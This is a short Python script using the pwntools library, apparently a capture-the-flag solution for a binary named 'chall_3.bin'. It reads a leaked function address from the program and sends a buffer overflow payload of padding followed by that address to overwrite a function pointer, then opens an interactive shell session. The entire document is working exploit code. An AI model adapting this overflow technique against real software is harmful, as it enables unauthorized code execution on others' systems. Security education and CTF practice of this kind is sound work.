#!/usr/bin/env python3

from pwn import *

p = process("./chall_3.bin")

line = p.recvuntil("shell: ")
shell_address = int(p.recvline().strip(), 16)
log.info('shell_address: ' + hex(shell_address))

payload = b"A" * 16 # name
payload += b"A" * 8 # pad
payload += p64(shell_address) # func

p.recv()
p.sendline(payload)
p.interactive()